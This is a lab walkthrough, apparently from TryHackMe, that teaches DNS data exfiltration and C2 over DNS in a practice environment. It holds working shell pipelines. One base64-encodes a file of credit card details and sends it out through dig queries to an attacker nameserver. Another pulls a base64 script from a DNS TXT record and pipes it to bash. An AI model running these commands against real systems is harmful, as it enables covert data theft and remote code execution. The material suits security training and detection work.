The DNS protocol is a common protocol and Its primary purpose is to resolve domain names to IP addresses and vice versa. Even though the DNS protocol is not designed to transfer data, threat actors found a way to abuse and move data over it. This task shows a technique to exfiltrate data over the DNS protocol.

What is DNS Data Exfiltration?

Since DNS is not a transport protocol, many organizations don't regularly monitor the DNS protocol! The DNS protocol is allowed in almost all firewalls in any organization network. For those reasons, threat actors prefer using the DNS protocol to hide their communications.![DNS Protocol Limitations](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/8bbc858294e45de16712024af22181fc.png)

The DNS protocol has limitations that need to be taken into consideration, which are as follows,

-   The maximum length of the Fully Qualified FQDN domain name (including .separators) is 255 characters.
-   The subdomain name (label) length must not exceed 63 characters (not including .com, .net, etc).

Based on these limitations, we can use a limited number of characters to transfer data over the domain name. If we have a large file, 10 MB for example, it may need more than 50000 DNS requests to transfer the file completely. Therefore, it will be noisy traffic and easy to notice and detect.

Now let's discuss the Data Exfiltration over DNS requirements and steps, which are as follows:  

![Data Exfiltration - Data flow](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/9881e420044ca01239d34c858342b888.png)  

1.  An attacker registers a domain name, for example, **tunnel.com** 
2.  The attacker sets up tunnel.com's NS record points to a server that the attacker controls.
3.  The malware or the attacker sends sensitive data from a victim machine to a domain name they control—for example, passw0rd.tunnel.com, where **passw0rd** is the data that needs to be transferred.
4.  The DNS request is sent through the local DNS server and is forwarded through the Internet.
5.  The attacker's authoritative DNS (malicious server) receives the DNS request.
6.  Finally, the attacker extracts the password from the domain name.

When do we need to use the DNS Data Exfiltration?

There are many use case scenarios, but the typical one is when the firewall blocks and filters all traffic. We can pass data or TCP/UDP packets through a firewall using the DNS protocol, but it is important to ensure that the DNS is allowed and resolving domain names to IP addresses.  

![Firewall Blocks not allowed TCP/UDP traffic](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e881336d12bd5f24d2167730adda0adc.png)  

Modifying the DNS Records!

Now let's try to perform a DNS Data Exfiltration in the provided network environment. Note we will be using the **tunnel.com** domain name in this scenario. We also provide a web interface to modify the DNS records of tunnel.com to insert a Name Server (NS) that points to your AttackBox machine. Ensure to complete these settings in task 8.

DNS Data Exfiltration

Now let's explain the manual DNS Data Exfiltration technique and show how it works. Assume that we have a creds.txt file with sensitive data, such as credit card information. To move it over the DNS protocol, we need to encode the content of the file and attach it as a subdomain name as follows,![Encoding Technique](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/a7ac15da0501d577dadcf53b4143ff98.png)

1.  Get the required data that needs to be transferred.
2.  Encode the file using one of the encoding techniques.
3.  Send the encoded characters as subdomain/labels.
4.  Consider the limitations of the DNS protocol. Note that we can add as much data as we can to the domain name, but we must keep the whole URL under 255 characters, and each subdomain label can't exceed 63 characters. If we do exceed these limits, we split the data and send more DNS requests!

Now let's try to perform the DNS Data Exfiltration technique in the provided network environment. This section aims to transfer the content of the creds.txt file from victim2 to attacker. We will use the att.tunnel.com nameserver, pointing to the newly added machine (the attacker machine).

Important: You can use the AttackBox for this task but ensure to update the DNS records and add an NS record that points to your AttackBox's IP address or use the preconfigured nameserver att.tunnel.com for the attacker machine.

The first thing to do is make the attacker machine ready to receive any DNS request. Let's connect to the attacker machine through SSH, which could be done from the Jump Box using the following credentials: thm:tryhackme.

Connect to the Attacker machine via SSH Client from JumpBox  

           
```
thm@jump-box$ ssh thm@attacker.thm.com
```   

Or from the AttackBox machine using the 10.10.10.143 and port 2322 as follows,

Connect to the Attacker machine via SSH Client from AttackBox  

           
``` 
root@AttackBox$ ssh thm@10.10.10.143 -p 2322

```


In order to receive any DNS request, we need to capture the network traffic for any incoming UDP/53 packets using the tcpdump tool.

Capturing DNS requests on the Attacker Machine  

```
thm@attacker$ sudo tcpdump -i eth0 udp port 53 -v tcpdump: listening on eth0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

Once the attacker machine is ready, we can move to the next step which is to connect to our victim2 through SSH, which could be done from the Jump Box using the following credentials: thm:tryhackme.

Connect to Victim 2 via SSH Client from JumpBox  

           
```
thm@jump-box$ ssh thm@victim2.thm.com`
``` 

Or from the AttackBox machine using the 10.10.10.143 and port 2122 as follows,

Connect to Victim 2 via SSH Client from AttackBox  

```
root@AttackBox$ ssh thm@10.10.10.143 -p 2122`
```
On the victim2 machine, there is a task9/credit.txt file with dummy data.  

Checking the content of the creds.txt file  

```

thm@victim2$ cat task9/credit.txt Name: THM-user Address: 1234 Internet, THM Credit Card: 1234-1234-1234-1234 Expire: 05/05/2022 Code: 1337 

```
	    

In order to send the content of a file, we need to convert it into a string representation which could be done using any encoding representation such as Base64, Hex, Binary, etc. In our case, we encode the file using Base64 as follows,  

Encoding the Content of the credit.txt File  

```
hm@victim2$ cat task9/credit.txt | base64 TmFtZTogVEhNLXVzZXIKQWRkcmVzczogMTIzNCBJbnRlcm5ldCwgVEhNCkNyZWRpdCBDYXJkOiAx MjM0LTEyMzQtMTIzNC0xMjM0CkV4cGlyZTogMDUvMDUvMjAyMgpDb2RlOiAxMzM3Cg==

```
	    

Now that we have the Base64 representation, we need to split it into one or multiple DNS requests depending on the output's length (DNS limitations) and attach it as a subdomain name. Let's show both ways starting with splitting for multiple DNS requests.

Splitting the content into multiple DNS requests  


```
thm@victim2:~$ cat task9/credit.txt | base64 | tr -d "\n"| fold -w18 | sed -r 's/.*/&.att.tunnel.com/' 

TmFtZTogVEhNLXVzZX.att.tunnel.com IKQWRkcmVzczogMTIz.att.tunnel.com NCBJbnRlcm5ldCwgVE.att.tunnel.com hNCkNyZWRpdCBDYXJk.att.tunnel.com OiAxMjM0LTEyMzQtMT.att.tunnel.com IzNC0xMjM0CkV4cGly.att.tunnel.com ZTogMDUvMDUvMjAyMg.att.tunnel.com pDb2RlOiAxMzM3Cg==.att.tunnel.com

```

In the previous command, we read the file's content and encoded it using Base64. Then, we cleaned the string by removing the new lines and gathered every 18 characters as a group. Finally, we appended the name server "att.tunnel.com" for every group. 

Let's check the other way where we send a single DNS request, which we will be using for our data exfiltration. This time, we split every 18 characters with a dot "." and add the name server similar to what we did in the previous command.

Splitting the content into a single DNS request  

```
thm@victim2:~$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ 

TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com

```


Next, from the victim2 machine, we send the base64 data as a subdomain name with considering the DNS limitation as follows:  

Send the Encoded data via the dig command  

```
thm@victim2:~$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
```
   

With some adjustments to the single DNS request, we created and added the dig command to send it over the DNS, and finally, we passed it to the bash to be executed. If we check the Attacker's tcpdump terminal, we should receive the data we sent from victim2.  

Receiving the Data Using tcpdump  

```
thm@attacker:~$ sudo tcpdump -i eth0 udp port 53 -v tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes 


22:14:00.287440 IP (tos 0x0, ttl 64, id 60579, offset 0, flags [none], proto UDP (17), length 104)     172.20.0.1.56092 > attacker.domain: 19543% [1au] A? _.pDb2RlOiAxMzM3Cg==.att.tunnel.com. (76) 22:14:00.288208 IP (tos 0x0, ttl 64, id 60580, offset 0, flags [none], proto UDP (17), length 235)     172.20.0.1.36680 > attacker.domain: 23460% [1au] A? TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com. (207) 22:14:00.289643 IP (tos 0x0, ttl 64, id 48564, offset 0, flags [DF], proto UDP (17), length 69)     attacker.52693 > 172.20.0.1.domain: 3567+ PTR? 1.0.20.172.in-addr.arpa. (41) 22:14:00.289941 IP (tos 0x0, ttl 64, id 60581, offset 0, flags [DF], proto UDP (17), length 123)     172.20.0.1.domain > attacker.52693: 3567 NXDomain* 0/1/0 (95)

```

Once our DNS request is received, we can stop the tcpdump tool and clean the received data by removing unwanted strings, and finally decode back the data using Base64 as follows,

Cleaning and Restoring the Receiving Data  

```
thm@attacker:~$ echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d 


Name: THM-user Address: 1234 Internet, T
HM Credit Card: 1234-1234-1234-1234 
Expire: 05/05/2022 Code: 1337

```
	    

Nice! We have successfully transferred the content of the credit.txt over the DNS protocol manually.

C2 Communications over DNS

C2 frameworks use the DNS protocol for communication, such as sending a command execution request and receiving execution results over the DNS protocol. They also use the TXT DNS record to run a dropper to download extra files on a victim machine. This section simulates how to execute a bash script over the DNS protocol. We will be using the web interface to add a TXT DNS record to the tunnel.com domain name.

For example, let's say we have a script that needs to be executed in a victim machine. First, we need to encode the script as a Base64 representation and then create a TXT DNS record of the domain name you control with the content of the encoded script. The following is an example of the required script that needs to be added to the domain name:  

```bash
#!/bin/bash 
ping -c 1 test.thm.com
```

The script executes the ping command in a victim machine and sends one ICMP packet to test.tunnel.com. Note that the script is an example, which could be replaced with any content. Now save the script to/tmp/script.sh using your favorite text editor and then encode it with Base64 as follows,

Encode the Bash Script as Base64 Representation  

```
thm@victim2$ cat /tmp/script.sh | base64  IyEvYmluL2Jhc2gKcGluZyAtYyAxIHRlc3QudGhtLmNvbQo=
```
   

Now that we have the Base64 representation of our script, we add it as a TXT DNS record to the domain we control, which in this case, the tunnel.com. You can add it through the web interface we provide http://10.10.10.143/ or https://10-10-10-143.p.thmlabs.com/ without using a VPN. 

Once we added it, let's confirm that we successfully created the script's DNS record by asking the local DNS server to resolve the TXT record of the script.tunnel.com. If everything is set up correctly, we should receive the content we added in the previous step.   

![DNS Server - Resolving TXT Record](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/38b87cfbbe254bef1e98f0dffa49451f.png)  

Confirm the TXT record is Added Successfully  

```

thm@victim2$ dig +short -t TXT script.tunnel.com

```

We used the dig command to check the TXT record of our DNS record that we added in the previous step! As a result, we can get the content of our script in the TXT reply. Now we confirmed the TXT record, let's execute it as follows,

Execute the Bash Script!  

```
thm@victim2$ dig +short -t TXT script.tunnel.com | tr -d "\"" | base64 -d | bash
```
 

